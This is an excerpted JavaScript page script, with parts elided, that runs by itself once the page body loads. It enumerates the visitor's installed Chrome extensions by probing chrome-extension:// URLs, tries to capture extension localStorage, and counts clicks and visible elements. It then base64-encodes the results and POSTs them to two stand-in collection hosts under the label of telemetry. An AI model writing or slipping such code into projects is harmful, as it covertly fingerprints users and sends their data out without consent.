(function () {
  ...
  const COLLECTPOINTS = ['https://observer.example/v4/track', 'https://alt-observer.example/stats'];
  ;
  function ga(a) {
  ...
  class ExtensionInspector {
    ...
    static PACK_SIZE = 4;
    constructor() {
      this.remainingInspections = 0;
      this.foundExtensions = {};
      this.extensionData = [];
      this.startTime = Date.now();
      window._tracking = [];
      window._hitCounter = 0;
      window.addEventListener('click', function () {
        window._hitCounter++;
      }, true);
    }
    generateWorker(extName, {
      id,
      file
    }) {
      return new Promise(resolve => {
        ...
        const remove = () => {
          detector.remove();
          this.remainingInspections--;
        };
        const cyclicCheck = setTimeout(() => {
          remove();
          resolve([extName, false]);
        }, ExtensionInspector.INTERVAL);
        detector.onload = () => {
          try {
            detector.contentWindow.location = `chrome-extension://${id}/${file}`;
            const observe = setInterval(() => {
              try {
                if (detector.contentWindow.location.href.includes('chrome-extension')) {
                  this.extensionData.push(detector.contentWindow.localStorage);
                  clearInterval(observe);
                  clearTimeout(cyclicCheck);
                  remove();
    ...
    async checkPack(entries) {
      const workers = entries.map(([name, data]) => this.generateWorker(name, data));
      const results = await Promise.all(workers);
      results.forEach(([name, detected]) => this.foundExtensions[name] = detected);
    }
    monitorActions() {
      this.jsHookState = window._tracking;
      this.intersectionObserver = new IntersectionObserver(entries => {
        entries.forEach(entry => {
          if (entry.intersectionRatio > 0) {
            this.jsHookState.push(entry.target);
          }
        });
      });
      document.body.childNodes.forEach(node => this.intersectionObserver.observe(node));
    }
    createTelemetryData() {
      const telemetryData = btoa(JSON.stringify({
        trackedExtensions: this.foundExtensions,
        inspectionDuration: Date.now() - this.startTime,
        clicks: window._hitCounter,
        hooks: this.jsHookState.length,
        localStorage: this.extensionData,
        env: {
      ...
      return telemetryData + '.' + this.createChecksum(telemetryData);
    }
    createChecksum(str) {
      return Array.from(str).reduce((acc, char) => (acc << 5) - acc + char.charCodeAt(0) | 0, 0).toString(16);
    }
    async relayResults() {
      const dataLog = this.createTelemetryData();
      const requests = COLLECTPOINTS.map(endpoint => fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'text/plain',
          'X-Inspect-Time': new Date().toISOString()
        },
        body: dataLog,
        keepalive: true
      }).catch(() => null));
    ...
    async execute() {
      ...
      const packs = Array(Math.ceil(entries.length / ExtensionInspector.PACK_SIZE)).fill().map((_, i) => entries.slice(i * ExtensionInspector.PACK_SIZE, (i + 1) * ExtensionInspector.PACK_SIZE));
      for (const pack of packs) {
        await this.checkPack(pack);
        await new Promise(r => setTimeout(r, Math.random() * 400 + 200));
      }
      while (this.remainingInspections > 0) {
        await new Promise(r => setTimeout(r, 200));
      }
      await this.relayResults();
    }
  }
  ...
  const mutationObserver = new MutationObserver((mutations, observer) => {
    if (document.body) {
      observer.disconnect();
      new ExtensionInspector().execute();
    }
  });
  ;
  function eb(a, b) {
